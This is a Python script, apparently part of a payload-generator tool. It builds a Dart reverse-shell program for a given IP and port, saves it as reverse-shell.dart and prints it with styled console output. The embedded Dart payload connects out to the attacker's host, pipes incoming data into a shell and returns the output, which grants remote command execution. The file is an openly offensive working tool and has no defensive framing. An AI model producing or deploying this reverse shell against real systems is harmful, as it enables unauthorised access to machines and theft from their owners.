from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def DartShell(ip, port):
    payload = """import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("%s", %d).then((socket) {
    socket.listen((data) {
      Process.start('sh', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}""" % (ip, port)
    with open("reverse-shell.dart", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="triangle"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"dart",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.dart\n[/#aed06d]", style=myStyle)